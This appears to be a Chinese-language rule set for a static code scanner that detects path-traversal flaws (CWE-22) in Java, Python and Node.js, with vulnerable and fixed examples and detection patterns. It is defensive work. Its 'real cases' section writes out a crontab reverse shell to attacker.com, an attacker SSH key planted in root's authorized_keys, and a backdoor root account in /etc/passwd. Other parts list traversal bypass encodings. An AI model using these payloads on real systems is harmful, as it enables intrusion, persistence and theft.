# 目录穿越 - 文件读取使用用户输入（读穿越）

> 文件读取操作使用用户输入路径，攻击者可通过 `../` 读取敏感文件（如 `/etc/passwd`、数据库配置等）。

```yaml
id: path-read-traversal
languages: [python, javascript, typescript]
severity: ERROR
cwe: CWE-22
owasp: A01:2021
```

> 说明：Java 场景由 `path-traversal-taint`（数据流分析）接管，本规则不再覆盖 Java。

## 风险说明

攻击者可构造 `../../etc/passwd` 读取系统敏感文件，或 `../../config/database.yml` 读取数据库配置。

## 违规示例

### Java
```java
// 直接读取用户输入的文件路径
String filename = request.getParameter("file");
File file = new File(filename);  // 攻击者可传入 ../../etc/passwd
return Files.readAllBytes(file.toPath());
```

### Python
```python
# 直接读取用户输入的文件路径
filename = request.args.get('file')
with open(filename, 'r') as f:  # 攻击者可传入 ../../etc/passwd
    return f.read()
```

### Node.js
```javascript
// 直接读取用户输入的文件路径
const filename = req.query.file;
fs.readFile(filename, 'utf8', (err, data) => {  // 攻击者可传入 ../../etc/passwd
    res.send(data);
});
```

## 正确示例

```java
// 路径规范化 + 白名单校验
Path baseDir = Paths.get("/safe/dir").toAbsolutePath().normalize();
Path target = baseDir.resolve(userInput).normalize();
if (!target.startsWith(baseDir)) {
    throw new SecurityException("Path traversal detected");
}
return Files.readAllBytes(target);
```

## 检测模式

### Python

```pattern
open($PATH, ...)
```

```pattern
send_file($PATH)
```

```pattern-not
os.path.realpath($PATH)
```

```pattern-not
os.path.abspath($PATH)
```

```pattern-not
pathlib.Path($PATH).resolve()
```

### Node.js

```pattern
fs.readFile($USER_INPUT, ...)
```

---

# 目录穿越 - 文件写入使用用户输入（写穿越，高危）

> 文件写入操作使用用户输入路径，攻击者可通过 `../` 覆盖系统关键文件（如 `/etc/passwd`、`crontab`、配置文件等）。

```yaml
id: path-write-traversal
languages: [python, javascript, typescript]
severity: CRITICAL
cwe: CWE-22
owasp: A01:2021
```

> 说明：Java 场景由 `path-traversal-taint`（数据流分析）接管，本规则不再覆盖 Java。

## 风险说明

**写穿越比读穿越更危险**，攻击者可：
- 覆盖 `/etc/passwd` 添加后门账户
- 覆盖 `crontab` 添加定时任务执行恶意脚本
- 覆盖 SSH 公钥文件 `~/.ssh/authorized_keys` 获取远程访问权限
- 覆盖应用配置文件注入恶意配置

## 真实案例

### 案例 1: 覆盖 crontab 获取持久化权限
```bash
# 攻击者上传文件，文件名为：
../../../var/spool/cron/crontabs/root

# 文件内容：
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

### 案例 2: 覆盖 SSH 公钥获取远程访问
```bash
# 攻击者上传文件，文件名为：
../../../root/.ssh/authorized_keys

# 文件内容：
ssh-rsa AAAAB3... attacker@evil.com
```

### 案例 3: 覆盖 /etc/passwd 添加后门账户
```bash
# 攻击者上传文件，文件名为：
../../../etc/passwd

# 文件内容（追加）：
backdoor:x:0:0:root:/root:/bin/bash
```

## 违规示例

### Java
```java
// 文件上传 - 文件名未校验
String filename = request.getParameter("filename");
File dest = new File(uploadDir, filename);  // 攻击者可传入 ../../../etc/crontab
file.transferTo(dest);
```

### Python
```python
# 文件上传 - 文件名未校验
filename = request.form['filename']
filepath = os.path.join(upload_dir, filename)  # 攻击者可传入 ../../../etc/crontab
with open(filepath, 'w') as f:
    f.write(content)
```

### Node.js
```javascript
// 文件上传 - 文件名未校验
const filename = req.body.filename;
const filepath = path.join(uploadDir, filename);  // 攻击者可传入 ../../../etc/crontab
fs.writeFileSync(filepath, content);
```

## 正确示例

```java
// 文件名白名单 + 路径规范化
String filename = request.getParameter("filename");
// 1. 只允许字母、数字、下划线、点
if (!filename.matches("^[a-zA-Z0-9_\\.]+$")) {
    throw new SecurityException("Invalid filename");
}
// 2. 路径规范化
Path baseDir = Paths.get(uploadDir).toAbsolutePath().normalize();
Path target = baseDir.resolve(filename).normalize();
// 3. 校验路径边界
if (!target.startsWith(baseDir)) {
    throw new SecurityException("Path traversal detected");
}
Files.write(target, content);
```

## 检测模式

### Python

```pattern
open($PATH, "w", ...)
```

```pattern
open($PATH, "wb", ...)
```

```pattern
$FILE = request.files[...]
...
$FILE.save($PATH)
```

```pattern-not
os.path.realpath($PATH)
```

```pattern-not
os.path.abspath($PATH)
```

```pattern-not
pathlib.Path($PATH).resolve()
```

### Node.js

```pattern
fs.writeFile($PATH, ...)
```

```pattern
fs.writeFileSync($PATH, ...)
```

---

# 目录穿越 - 文件上传文件名未校验

> 文件上传时未校验文件名，攻击者可通过 `../` 将文件写入任意目录。

```yaml
id: path-upload-traversal
languages: [python, javascript, typescript]
severity: CRITICAL
cwe: CWE-22
owasp: A01:2021
```

> 说明：Java 上传场景由 `path-traversal-taint`（数据流分析，源含 getOriginalFilename，汇聚含 transferTo）接管。

## 风险说明

文件上传是最常见的写穿越场景，攻击者可通过构造恶意文件名（如 `../../../etc/crontab`）将文件写入系统目录。

## 违规示例

### Java (Spring)
```java
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String filename = file.getOriginalFilename();  // 未校验文件名
    File dest = new File(uploadDir, filename);     // 攻击者可传入 ../../../etc/crontab
    file.transferTo(dest);
    return "success";
}
```

### Python (Flask)
```python
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    filename = file.filename  # 未校验文件名
    filepath = os.path.join(upload_dir, filename)  # 攻击者可传入 ../../../etc/crontab
    file.save(filepath)
    return "success"
```

### Node.js (Express)
```javascript
app.post('/upload', (req, res) => {
    const file = req.files.file;
    const filename = file.name;  // 未校验文件名
    const filepath = path.join(uploadDir, filename);  // 攻击者可传入 ../../../etc/crontab
    file.mv(filepath);
    res.send("success");
});
```

## 正确示例

```java
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String filename = file.getOriginalFilename();
    
    // 1. 文件名白名单校验
    if (filename == null || !filename.matches("^[a-zA-Z0-9_\\.]+$")) {
        throw new SecurityException("Invalid filename");
    }
    
    // 2. 文件类型校验
    String ext = filename.substring(filename.lastIndexOf('.') + 1).toLowerCase();
    if (!Arrays.asList("jpg", "png", "pdf").contains(ext)) {
        throw new SecurityException("Invalid file type");
    }
    
    // 3. 生成安全的文件名
    String safeFilename = UUID.randomUUID().toString() + "." + ext;
    
    // 4. 路径规范化
    Path baseDir = Paths.get(uploadDir).toAbsolutePath().normalize();
    Path target = baseDir.resolve(safeFilename).normalize();
    
    file.transferTo(target.toFile());
    return "success";
}
```

## 检测模式

### Python

```pattern
file.save($PATH)
```

### Node.js

```pattern
file.mv($PATH)
```

---

# 目录穿越 - 配置文件路径使用用户输入

> 配置文件路径使用用户输入，攻击者可通过 `../` 读取或覆盖敏感配置文件。

```yaml
id: path-config-traversal
languages: [python, javascript, typescript]
severity: HIGH
cwe: CWE-22
owasp: A01:2021
```

> 说明：Java 场景由 `path-traversal-taint`（数据流分析）接管，本规则不再覆盖 Java。

## 风险说明

攻击者可读取数据库配置、API 密钥等敏感信息，或覆盖配置文件注入恶意配置。

## 违规示例

```java
// 动态加载配置文件
String configPath = request.getParameter("config");
Properties props = new Properties();
props.load(new FileInputStream(configPath));  // 攻击者可传入 ../../config/database.yml
```

```python
# 动态加载配置文件
config_path = request.args.get('config')
with open(config_path, 'r') as f:  # 攻击者可传入 ../../config/database.yml
    config = yaml.safe_load(f)
```

## 正确示例

```java
// 配置文件路径白名单
String configName = request.getParameter("config");
if (!configName.matches("^[a-zA-Z0-9_\\.]+$")) {
    throw new SecurityException("Invalid config name");
}
String configPath = "/etc/myapp/" + configName;  // 固定目录
Properties props = new Properties();
props.load(new FileInputStream(configPath));
```

## 检测模式

### Python

```pattern
open($USER_INPUT, ...)
```

```pattern-not
os.path.realpath($USER_INPUT)
```

```pattern-not
pathlib.Path($USER_INPUT).resolve()
```

---

# 目录穿越 - 日志文件路径使用用户输入

> 日志文件路径使用用户输入，攻击者可通过 `../` 覆盖系统日志或其他文件。

```yaml
id: path-log-traversal
languages: [python, javascript, typescript]
severity: HIGH
cwe: CWE-22
owasp: A01:2021
```

> 说明：Java 场景由 `path-traversal-taint`（数据流分析）接管，本规则不再覆盖 Java。

## 风险说明

攻击者可通过覆盖日志文件隐藏攻击痕迹，或通过日志注入执行恶意代码（如 Log4Shell）。

## 违规示例

```java
// 动态日志文件路径
String logFile = request.getParameter("log");
Logger logger = Logger.getLogger("custom");
logger.addHandler(new FileHandler(logFile));  // 攻击者可传入 ../../../var/log/auth.log
```

```python
# 动态日志文件路径
log_file = request.args.get('log')
logging.basicConfig(filename=log_file)  # 攻击者可传入 ../../../var/log/auth.log
```

## 检测模式

### Python

```pattern
logging.basicConfig(filename=$USER_INPUT)
```

---

# 目录穿越 - 用户输入流入文件路径（数据流分析）

> 用户可控数据（HTTP 请求、上传文件名、反序列化结果）经任何赋值/拼接传播后流入文件路径操作。基于 Semgrep taint 模式做过程内数据流追踪，替代纯模式匹配：常量拼接与已净化（basename / 规范化）场景不再误报。

```yaml
id: path-traversal-taint
languages: [java]
severity: CRITICAL
cwe: CWE-22
owasp: A01:2021
```

## 检测原理

- **污点源**：Servlet 请求参数/头/流、Spring 上传原始文件名、ObjectInputStream 反序列化结果
- **污点汇聚**：文件构造与读写 API（File、流、NIO、transferTo）
- **净化器**：basename（getName/getFileName）、路径规范化（getCanonicalPath/getCanonicalFile/normalize/toRealPath）

常量目录拼接常量文件名（如 `new File("/data", "a.txt")`）无污点源，不报；
`baseDir.resolve(userInput)` 不在汇聚点内，配合 startsWith 白名单校验的场景不报。

## 检测模式

```pattern-sources
$REQ.getParameter(...)
$REQ.getHeader(...)
$REQ.getQueryString()
$REQ.getInputStream()
$REQ.getReader()
$FILE.getOriginalFilename()
spring-entrypoint-param
(ObjectInputStream $O).readObject()
```

```pattern-sinks
new File(...)
new FileInputStream(...)
new FileOutputStream(...)
new FileWriter(...)
Paths.get(...)
Files.newInputStream(...)
Files.newOutputStream(...)
Files.readAllBytes(...)
Files.write(...)
$RES.getResourceAsStream(...)
$FILE.transferTo(...)
```

```pattern-sanitizers
$F.getName()
$P.getFileName()
$F.getCanonicalPath()
$F.getCanonicalFile()
$P.normalize()
$P.toRealPath(...)
```

---

# 目录穿越 - 系统关键文件检测

> 检测代码中是否直接引用系统关键文件路径，这些文件不应被用户输入影响。

```yaml
id: path-system-files
languages: [java, python, javascript, typescript]
severity: WARNING
cwe: CWE-22
owasp: A01:2021
```

## 系统关键文件清单

### Linux/Unix
- `/etc/passwd` - 用户账户信息
- `/etc/shadow` - 用户密码哈希
- `/etc/crontab` - 定时任务配置
- `/etc/ssh/sshd_config` - SSH 服务配置
- `~/.ssh/authorized_keys` - SSH 公钥
- `/var/spool/cron/` - 用户 crontab 目录
- `/etc/sudoers` - sudo 权限配置

### Windows
- `C:\Windows\System32\config\SAM` - 用户账户数据库
- `C:\Windows\System32\drivers\etc\hosts` - 主机名映射
- `C:\Users\<user>\.ssh\authorized_keys` - SSH 公钥

## 检测模式

```pattern
"/etc/passwd"
```

```pattern
"/etc/shadow"
```

```pattern
"/etc/crontab"
```

```pattern
"/etc/ssh/sshd_config"
```

```pattern
"authorized_keys"
```

---

# 目录穿越 - 路径穿越模式检测

> 检测代码中是否包含路径穿越模式（`../`、`..\`、`%2e%2e%2f` 等）。

```yaml
id: path-traversal-pattern
languages: [java, python, javascript, typescript]
severity: WARNING
cwe: CWE-22
owasp: A01:2021
enabled: false
```

> **已禁用**：该规则匹配字面量 `"../"` 等字符串，在相对导入、path.join 等安全场景产生大量 FP（freeCodeCamp 120 条 FP）。推荐使用数据流分析规则 `path-traversal-taint`（Java）或 `path-python-open`/`path-js-readfile`（Python/JS）替代。

## 常见穿越模式

### 基础穿越
- `../` - Unix 目录穿越
- `..\` - Windows 目录穿越
- `..%2f` - URL 编码穿越
- `%2e%2e%2f` - 双重 URL 编码穿越
- `..%5c` - Windows URL 编码穿越

### 绕过技术
- `....//` - 双写绕过
- `..../` - 双写绕过
- `.././` - 混合绕过
- `/%2e%2e/` - 编码绕过

## 检测模式

```pattern
"../"
```

```pattern
"..\\"
```

```pattern
"%2e%2e"
```

```pattern
"..%2f"
```

```pattern
"..%5c"
```

```pattern-not
require("...")
```

```pattern-not
require('...')
```

```pattern-not
import "..."
```

```pattern-not
import '...'
```

```pattern-not
from "..."
```

```pattern-not
from '...'
```

```pattern-not
path.join(...)
```

```pattern-not
path.resolve(...)
```
